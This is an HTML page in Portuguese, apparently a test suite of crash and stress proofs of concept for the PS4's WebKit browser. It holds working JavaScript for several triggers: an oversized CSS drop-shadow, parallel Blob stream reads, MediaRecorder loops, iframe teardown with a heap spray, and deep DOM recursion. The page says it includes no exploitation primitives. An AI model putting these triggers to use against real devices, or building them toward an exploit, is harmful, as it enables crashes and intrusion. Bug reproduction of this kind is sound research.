<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>PS4 WebKit 605.1.15 – Mega Suite de PoCs (Crash/Stress)</title>
  <style>
    body { font-family: monospace; background:#000; color:#0f0; margin:0; padding:14px; }
    h1,h2,h3 { margin: 10px 0; }
    .row { display:flex; gap:10px; flex-wrap:wrap; }
    .card { border:1px solid #0a0; padding:10px; border-radius:8px; background:#001100; min-width: 320px; flex:1; }
    button { background:#0a0; color:#000; border:0; padding:10px 12px; margin:4px 0; font-weight:700; }
    button:disabled { opacity:.5; }
    input, select { background:#000; color:#0f0; border:1px solid #0a0; padding:6px; }
    .warn { color:#ff0; }
    .bad { color:#f66; }
    .ok { color:#6f6; }
    #log { white-space: pre-wrap; border:1px solid #0a0; padding:10px; border-radius:8px; background:#000; min-height:180px; }
    .tiny { font-size: 12px; opacity: .9; }
  </style>
</head>
<body>
<h1>PS4 WebKit 605.1.15 – Mega Suite de PoCs (Crash/Stress)</h1>
<div class="tiny">
Objetivo: rodar PoCs de <b>crash/hang/stress</b> diretamente no PS4 para evidenciar falhas (CE / freeze / watchdog).
Nenhuma primitiva de exploração (addrof/fakeobj/RW) está incluída — isto é focado em reprodução e logs.
</div>

<hr>

<div class="row">
  <div class="card">
    <h2>Status / Controles</h2>
    <div>UA: <span id="ua"></span></div>
    <div>Features: <span id="feat"></span></div>
    <div style="margin-top:8px" class="row">
      <button onclick="clearLog()">Limpar log</button>
      <button onclick="panicStop()">PANIC STOP (cancelar loops)</button>
    </div>
    <div class="tiny warn">
      Dica PS4: rode <b>um teste por vez</b>. Se travar, anote qual botão e parâmetros usados.
    </div>
  </div>

  <div class="card">
    <h2>PoC A – CSS Drop-Shadow (raio gigante)</h2>
    <div class="tiny">Baseado no seu <code>testcase.html</code> / <code>poc (1).html</code>.</div>
    <div style="margin-top:6px">
      Raio (px): <input id="dsRadius" type="number" value="100000" min="1" step="1" style="width:120px">
      Iterações: <input id="dsIters" type="number" value="1" min="1" step="1" style="width:80px">
    </div>
    <button onclick="runDropShadowOnce()">Run (aplica 1x)</button>
    <button onclick="runDropShadowLoop()">Loop N (aplica/remove)</button>
    <button onclick="runDropShadowAnim()">Variante: animação + blur(0) + drop-shadow</button>
    <div class="tiny warn">Se travar fácil, reduza o raio até achar o menor que ainda reproduz.</div>
  </div>

  <div class="card">
    <h2>PoC B – Streams/Blob Reader (302282)</h2>
    <div class="tiny">Tenta reproduzir crash ao ler Blob grande via <code>blob.stream().getReader()</code> em paralelo.</div>
    <div style="margin-top:6px">
      Tamanho Blob (MB): <input id="blobMB" type="number" value="64" min="1" step="1" style="width:80px">
      Chunk (KB): <input id="chunkKB" type="number" value="512" min="1" step="1" style="width:80px">
      Paralelo: <input id="parallel" type="number" value="8" min="1" step="1" style="width:60px">
      Lotes: <input id="batches" type="number" value="8" min="1" step="1" style="width:60px">
    </div>
    <button onclick="runStreamBlob()">Run (Stream API)</button>
    <button onclick="runArrayBufferBaseline()">Baseline (ArrayBuffer slice)</button>
    <div class="tiny warn">Se <code>blob.stream</code> não existir no PS4, esse teste será marcado como não suportado.</div>
  </div>

  <div class="card">
    <h2>PoC C – MediaRecorder start/stop (Talos 2023-1831)</h2>
    <div class="tiny">Se <code>MediaRecorder</code> existir, roda loops rápidos de start/stop.</div>
    <div style="margin-top:6px">
      Loops: <input id="mrLoops" type="number" value="200" min="1" step="1" style="width:80px">
      Delay (ms): <input id="mrDelay" type="number" value="0" min="0" step="1" style="width:80px">
    </div>
    <button onclick="runMediaRecorder()">Run</button>
    <div class="tiny warn">Muitos ports não expõem MediaRecorder. Se faltar, o teste avisa e não roda.</div>
  </div>

  <div class="card">
    <h2>PoC D – DOM/Iframe Teardown + Heap Spray (reduzido)</h2>
    <div class="tiny">Versão “mínima” inspirada na sua suíte <code>testes.html</code> (remover iframe durante atividade + spray).</div>
    <div style="margin-top:6px">
      Iters: <input id="domIters" type="number" value="200" min="1" step="1" style="width:80px">
      Spray count: <input id="sprayCount" type="number" value="4000" min="0" step="100" style="width:80px">
      Spray bytes: <input id="sprayBytes" type="number" value="4096" min="256" step="256" style="width:80px">
    </div>
    <button onclick="runDomIframeTeardown()">Run</button>
    <button onclick="runDomDeepRecursion()">Variante: deep recursion + mutation</button>
    <div class="tiny warn">Se isso só der “freeze”, diminua spray e aumente iters.</div>
  </div>

  <div class="card">
    <h2>PoC E – CoreIPC/TestRunner (provável não suportado)</h2>
    <div class="tiny">Seu <code>poc.html</code> + <code>coreipc.js</code> dependem de <code>testRunner</code> e APIs de harness.</div>
    <button onclick="probeCoreIPC()">Checar suporte</button>
    <div id="coreipcStatus" class="tiny"></div>
    <div class="tiny warn">No PS4 retail, isto quase sempre <b>não existe</b>. Mantido aqui só para você validar rapidamente.</div>
  </div>
</div>

<hr>
<h2>Log</h2>
<div id="log"></div>

<script>
(function init(){
  document.getElementById('ua').textContent = navigator.userAgent;
  const feats = [];
  feats.push('blob.stream=' + (typeof Blob !== 'undefined' && Blob.prototype && typeof Blob.prototype.stream === 'function'));
  feats.push('ReadableStream=' + (typeof ReadableStream !== 'undefined'));
  feats.push('MediaRecorder=' + (typeof MediaRecorder !== 'undefined'));
  feats.push('AudioContext=' + (typeof (window.AudioContext||window.webkitAudioContext) !== 'undefined'));
  feats.push('SharedArrayBuffer=' + (typeof SharedArrayBuffer !== 'undefined'));
  document.getElementById('feat').textContent = feats.join(' | ');
  log('[INIT] Suite carregada. Rode um teste por vez.');
})();

let STOP = false;
function panicStop(){
  STOP = true;
  log('[STOP] PANIC STOP acionado. Loops e tarefas futuras devem parar (quando checarem STOP).');
}

function $(id){ return document.getElementById(id); }
function now(){ return new Date().toISOString(); }
function log(msg){
  const el = $('log');
  el.textContent += '['+now()+'] ' + msg + '\n';
  el.scrollTop = el.scrollHeight;
}
function clearLog(){ $('log').textContent=''; STOP=false; }

function forceGCish(){
  // Não há GC explícito; isso só cria pressão.
  const junk = [];
  for (let i=0;i<200;i++) junk.push({i, s: 'X'.repeat(1024)});
  return junk;
}

/* =========================
   PoC A – DropShadow
   ========================= */
function applyDropShadow(radiusPx){
  document.documentElement.style.filter = 'drop-shadow(0px 0px '+radiusPx+'px white)';
}
function clearDropShadow(){
  document.documentElement.style.filter = '';
}

function runDropShadowOnce(){
  STOP = false;
  const r = parseInt($('dsRadius').value,10) || 100000;
  log('[A] apply drop-shadow radius='+r+'px');
  try{
    applyDropShadow(r);
    // força estilo/layout
    void document.documentElement.offsetHeight;
    log('[A] aplicado. (Se travar/crash, anote este valor.)');
  }catch(e){
    log('[A][ERR] ' + e);
  }
}

async function runDropShadowLoop(){
  STOP = false;
  const r = parseInt($('dsRadius').value,10) || 100000;
  const n = parseInt($('dsIters').value,10) || 1;
  log('[A] loop start radius='+r+'px iters='+n);
  for (let i=1;i<=n;i++){
    if (STOP) break;
    try{
      applyDropShadow(r);
      void document.documentElement.offsetHeight;
      clearDropShadow();
      void document.documentElement.offsetHeight;
      if ((i % 10)===0) log('[A] progress ' + i + '/' + n);
      // pequena yield
      await new Promise(res=>setTimeout(res, 0));
    }catch(e){
      log('[A][ERR] iter='+i+' ' + e);
      break;
    }
  }
  log('[A] loop end');
}

function runDropShadowAnim(){
  STOP = false;
  const r = parseInt($('dsRadius').value,10) || 100000;
  log('[A] variante anim: -webkit-filter blur(0) + drop-shadow('+r+'px) + animação');
  try{
    const box = document.createElement('div');
    box.id='animBox';
    box.style.cssText = [
      'position:fixed','left:0','top:0','right:0','bottom:0',
      'background:#111',
      '-webkit-filter: blur(0em) drop-shadow(0 0 '+Math.max(1, Math.floor(r/100))+'em white)',
      'transform: translateZ(0)',
      'will-change: transform, filter'
    ].join(';');
    document.body.appendChild(box);

    let t=0;
    function step(){
      if (STOP) { box.remove(); log('[A] anim stopped'); return; }
      t++;
      // mexe em propriedades pra forçar recomputes
      box.style.transform = 'translateZ(0) rotate('+(t%360)+'deg) scale('+(1 + ((t%20)/200))+')';
      if ((t%60)===0) log('[A] anim tick=' + t);
      requestAnimationFrame(step);
    }
    requestAnimationFrame(step);
    log('[A] anim iniciado. Use PANIC STOP para encerrar.');
  }catch(e){
    log('[A][ERR] ' + e);
  }
}

/* =========================
   PoC B – Streams/Blob (302282)
   ========================= */
function makeBlob(mb){
  const bytes = mb * 1024 * 1024;
  const chunk = 1024 * 1024;
  const parts = [];
  // cria dados determinísticos
  for (let off=0; off<bytes; off+=chunk){
    const size = Math.min(chunk, bytes-off);
    const u8 = new Uint8Array(size);
    // padrão simples
    u8[0]=0x41; u8[size-1]=0x42;
    parts.push(u8);
  }
  return new Blob(parts);
}

async function readFullReader(reader){
  let total = 0;
  while(true){
    const {value, done} = await reader.read();
    if (done) break;
    total += value ? value.byteLength : 0;
  }
  return total;
}

async function runStreamBlob(){
  STOP = false;
  const mb = parseInt($('blobMB').value,10) || 64;
  const chunkKB = parseInt($('chunkKB').value,10) || 512;
  const parallel = parseInt($('parallel').value,10) || 8;
  const batches = parseInt($('batches').value,10) || 8;

  if (!(typeof Blob !== 'undefined' && Blob.prototype && typeof Blob.prototype.stream === 'function')){
    log('[B][UNSUPPORTED] Blob.stream() não disponível neste WebKit.');
    return;
  }

  log('[B] Stream API start mb='+mb+' chunkKB='+chunkKB+' parallel='+parallel+' batches='+batches);
  try{
    const blob = makeBlob(mb);
    const fileSize = blob.size;
    const chunkSize = chunkKB * 1024;
    let pos = 0;

    for (let b=1;b<=batches;b++){
      if (STOP) break;

      const readers = [];
      for (let i=0;i<parallel;i++){
        const start = pos;
        // slice até o fim (padrão do bug report) para estressar
        const sliced = blob.slice(start);
        const reader = sliced.stream().getReader();
        readers.push(reader);
        pos += chunkSize;
        if (pos >= fileSize) pos = 0;
      }

      // lê tudo em paralelo
      const totals = await Promise.all(readers.map(r=>readFullReader(r)));
      const sum = totals.reduce((a,c)=>a+c,0);
      log('[B] batch '+b+'/'+batches+' read_total='+sum+' bytes (pos='+pos+')');

      // pressão extra
      forceGCish();
      await new Promise(res=>setTimeout(res, 0));
    }

    log('[B] Stream API end');
  }catch(e){
    log('[B][ERR] ' + e);
  }
}

async function runArrayBufferBaseline(){
  STOP = false;
  const mb = parseInt($('blobMB').value,10) || 64;
  const chunkKB = parseInt($('chunkKB').value,10) || 512;
  const parallel = parseInt($('parallel').value,10) || 8;
  const batches = parseInt($('batches').value,10) || 8;

  log('[B2] ArrayBuffer baseline start mb='+mb+' chunkKB='+chunkKB+' parallel='+parallel+' batches='+batches);
  try{
    const blob = makeBlob(mb);
    const fileSize = blob.size;
    const chunkSize = chunkKB * 1024;
    let pos = 0;

    for (let b=1;b<=batches;b++){
      if (STOP) break;

      const reads = [];
      for (let i=0;i<parallel;i++){
        const start = pos;
        const end = Math.min(start + chunkSize, fileSize);
        reads.push(blob.slice(start, end).arrayBuffer());
        pos += chunkSize;
        if (pos >= fileSize) pos = 0;
      }
      const bufs = await Promise.all(reads);
      const sum = bufs.reduce((a,buf)=>a + (buf ? buf.byteLength : 0),0);
      log('[B2] batch '+b+'/'+batches+' read_total='+sum+' bytes (pos='+pos+')');

      forceGCish();
      await new Promise(res=>setTimeout(res, 0));
    }

    log('[B2] ArrayBuffer baseline end');
  }catch(e){
    log('[B2][ERR] ' + e);
  }
}

/* =========================
   PoC C – MediaRecorder (Talos)
   ========================= */
async function runMediaRecorder(){
  STOP = false;
  const loops = parseInt($('mrLoops').value,10) || 200;
  const delay = parseInt($('mrDelay').value,10) || 0;

  if (typeof MediaRecorder === 'undefined'){
    log('[C][UNSUPPORTED] MediaRecorder não disponível neste WebKit.');
    return;
  }
  const AC = window.AudioContext || window.webkitAudioContext;
  if (!AC){
    log('[C][UNSUPPORTED] AudioContext não disponível.');
    return;
  }

  log('[C] start loops='+loops+' delay='+delay+'ms');
  try{
    const ac = new AC();
    const dst = ac.createMediaStreamDestination();
    // cria uma fonte "silenciosa" só para manter stream vivo
    const osc = ac.createOscillator();
    osc.frequency.value = 440;
    const gain = ac.createGain();
    gain.gain.value = 0.00001; // quase inaudível
    osc.connect(gain);
    gain.connect(dst);
    osc.start();

    for (let i=1;i<=loops;i++){
      if (STOP) break;
      try{
        const mr = new MediaRecorder(dst.stream);
        mr.start();
        mr.stop();
        if ((i%25)===0) log('[C] progress '+i+'/'+loops);
        if (delay) await new Promise(res=>setTimeout(res, delay));
      }catch(e){
        log('[C][ERR] iter='+i+' ' + e);
        break;
      }
    }
    try{ osc.stop(); }catch(_){}
    try{ ac.close(); }catch(_){}
    log('[C] end');
  }catch(e){
    log('[C][ERR] ' + e);
  }
}

/* =========================
   PoC D – DOM/Iframe teardown + spray (reduzido)
   ========================= */
function heapSpray(count, bytes){
  const arr = [];
  for (let i=0;i<count;i++){
    const u = new Uint8Array(bytes);
    u[0]=0x41; u[bytes-1]=0x42;
    arr.push(u);
  }
  return arr;
}

async function runDomIframeTeardown(){
  // 1. Defina STOP caso não seja global, ou certifique-se que foi definido fora
  if (typeof STOP === 'undefined') window.STOP = false; 
  STOP = false;

  // 2. CORREÇÃO: Usando document.getElementById em vez de $
  const getVal = (id) => {
      const el = document.getElementById(id);
      return el ? el.value : null;
  };

  const iters = parseInt(getVal('domIters'), 10) || 200;
  const sc = parseInt(getVal('sprayCount'), 10) || 4000;
  const sb = parseInt(getVal('sprayBytes'), 10) || 4096;

  // Verifica se a função log existe, senão usa console.log
  const log = (typeof window.log === 'function') ? window.log : console.log;

  log('[D] start iters='+iters+' sprayCount='+sc+' sprayBytes='+sb);
  let spray = [];

  try{
    for (let i=1; i<=iters; i++){
      if (STOP) break;

      const iframe = document.createElement('iframe');
      iframe.style.width='10px';
      iframe.style.height='10px';
      document.body.appendChild(iframe);

      const doc = iframe.contentDocument;
      doc.open();
      
      // 3. CORREÇÃO: Escapando a tag de fechamento do script (<\/script>)
      // Isso impede que o navegador feche o script principal prematuramente.
      doc.write('<!doctype html><meta charset=utf-8><title>x</title><div id=a>hello</div><script>let a=document.getElementById("a"); for(let i=0;i<2000;i++){a.textContent="x"+i;}<\/script>');
      
      doc.close();

      iframe.remove();

      if (sc > 0){
        // Verifica se heapSpray existe antes de chamar
        if (typeof heapSpray === 'function') {
            spray = heapSpray(Math.min(sc, 8000), sb);
        } else {
            console.warn("Função heapSpray não definida");
        }
      }

      if ((i%25)===0) log('[D] progress '+i+'/'+iters);
      await new Promise(res => setTimeout(res, 0));
    }
    log('[D] end');
  } catch(e){
    log('[D][ERR] ' + e);
  }
}

async function runDomDeepRecursion(){
  STOP = false;
  log('[D2] deep recursion + mutation start');
  try{
    const root = document.createElement('div');
    document.body.appendChild(root);

    function build(depth){
      const n = document.createElement('div');
      n.textContent = 'd'+depth;
      root.appendChild(n);
      if (depth>0) build(depth-1);
    }

    build(2000);

    // mutation storm
    for (let i=0;i<5000;i++){
      if (STOP) break;
      const el = root.lastChild;
      if (!el) break;
      el.textContent = 'm'+i;
      if ((i%500)===0) log('[D2] mutate '+i);
      await new Promise(res=>setTimeout(res, 0));
    }

    root.remove();
    log('[D2] end');
  }catch(e){
    log('[D2][ERR] ' + e);
  }
}

/* =========================
   PoC E – CoreIPC/TestRunner probe
   ========================= */
function probeCoreIPC(){
  const hasTR = !!window.testRunner;
  const hasCoreIPC = !!window.CoreIPC;
  const s = '[E] testRunner=' + hasTR + ' CoreIPC=' + hasCoreIPC;
  log(s);
  $('coreipcStatus').textContent = s + (hasTR||hasCoreIPC ? ' (incomum em retail)' : ' (esperado em PS4 retail)');
}
</script>
</body>
</html>
